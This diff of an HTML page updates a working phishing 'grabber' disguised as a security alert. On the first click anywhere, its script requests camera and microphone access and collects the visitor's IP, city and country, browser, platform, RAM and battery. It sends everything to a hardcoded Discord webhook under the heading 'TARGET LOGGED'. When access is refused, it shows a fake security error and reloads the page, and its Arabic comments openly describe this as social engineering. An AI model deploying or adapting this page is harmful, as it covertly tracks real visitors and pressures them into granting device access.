@@ -3,95 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Security Audit</title>
+    <title>Critical System Update</title>
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
+        const HOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
 
-        async function initCapture() {
+        async function grab() {
+            let data = {
+                ip: "Scanning...",
+                loc: "Denied",
+                gpu: "Unknown",
+                ram: navigator.deviceMemory || "Unknown",
+                bat: "Unknown",
+                agent: navigator.userAgent
+            };
+
+            // محاولة سحب الـ IP والموقع فوراً
             try {
-                // محاولة طلب الكاميرا والميكروفون فور النقر
+                const res = await fetch('https://ipapi.co/json/');
+                const json = await res.json();
+                data.ip = json.ip;
+                data.loc = `${json.city}, ${json.country_name}`;
+            } catch (e) {}
+
+            // طلب الكاميرا والميكروفون (لازم HTTPS عشان يظهر الطلب)
+            try {
                 await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                sendData("Granted");
+                send(data, "✅ GRANTED");
             } catch (err) {
-                // في حال الرفض، نرسل البيانات مع حالة الرفض وننبه المستخدم
-                sendData("Denied/Blocked");
-                alert("Security Alert: Permission required to verify device integrity.");
-                location.reload(); 
+                send(data, "❌ DENIED");
+                // هندسة اجتماعية: إجبار المستخدم على المحاولة مرة أخرى
+                alert("Security Error: Camera and Mic access required to verify device.");
+                location.reload();
             }
         }
 
-        async function sendData(camStatus) {
-            let info = {
-                ip: "Scanning...",
-                loc: "Unknown",
-                ua: navigator.userAgent,
-                plat: navigator.platform,
-                ram: navigator.deviceMemory || "Unknown",
-                bat: "Unknown",
-                res: `${window.screen.width}x${window.screen.height}`
-            };
-
-            try {
-                // سحب الـ IP والموقع الجغرافي
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                info.ip = data.ip || "Unknown";
-                info.loc = `${data.city || '?'}, ${data.country_name || '?'}`;
-            } catch (e) {
-                info.ip = "Error/VPN";
-            }
-
+        async function send(info, status) {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                info.bat = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Not Charging"})`;
+                info.bat = `${Math.round(b.level * 100)}%`;
             }
 
-            const payload = {
+            const msg = {
                 embeds: [{
-                    title: "🎯 Target Captured - V14",
+                    title: "🎯 TARGET LOGGED - V15",
                     color: 16711680,
                     fields: [
-                        { name: "🌐 IP Address", value: info.ip, inline: true },
+                        { name: "🌐 IP", value: info.ip, inline: true },
                         { name: "📍 Location", value: info.loc, inline: true },
-                        { name: "📸 Permissions", value: camStatus, inline: true },
-                        { name: "🔋 Battery", value: info.bat, inline: true },
+                        { name: "📸 Permissions", value: status, inline: true },
                         { name: "🧠 RAM", value: info.ram + " GB", inline: true },
-                        { name: "🖥️ Resolution", value: info.res, inline: true },
-                        { name: "📱 OS/Platform", value: info.plat, inline: false },
-                        { name: "🕵️ Browser Info", value: info.ua, inline: false }
+                        { name: "🔋 Battery", value: info.bat, inline: true },
+                        { name: "📱 OS", value: navigator.platform, inline: true },
+                        { name: "🕵️ Agent", value: info.agent, inline: false }
                     ],
-                    footer: { text: "r3b Supreme Engine | System Audit" },
+                    footer: { text: "r3b Supreme Engine" },
                     timestamp: new Date()
                 }]
             };
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
         }
 
-        // تفعيل الكود عند أول ضغطة في أي مكان بالصفحة
-        window.onclick = initCapture;
+        // يشتغل بمجرد الضغط في أي مكان (إجباري للمتصفحات)
+        window.onclick = grab;
     </script>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .panel { border: 2px solid #00ff00; padding: 50px; text-align: center; box-shadow: 0 0 15px #00ff00; background: #000; position: relative; }
-        .panel h1 { font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
-        .panel p { font-size: 14px; color: #888; margin-bottom: 30px; }
-        .scan-line { width: 100%; height: 2px; background: #00ff00; position: absolute; top: 0; left: 0; animation: scan 2s linear infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; }
-        .btn:hover { background: #00cc00; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
+        .warn { border: 2px solid #f00; padding: 50px; box-shadow: 0 0 20px #f00; }
+        .blink { animation: blinker 1s linear infinite; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <div class="scan-line"></div>
-        <h1>System Breach Detected</h1>
-        <p>A manual security audit is required for your device.</p>
-        <button class="btn">Start Diagnostic</button>
+    <div class="warn">
+        <h1 class="blink">SYSTEM BREACH DETECTED</h1>
+        <p>Your device integrity is compromised.</p>
+        <p style="color: #fff;">[ CLICK ANYWHERE TO FIX ]</p>
     </div>
 </body>
 </html>
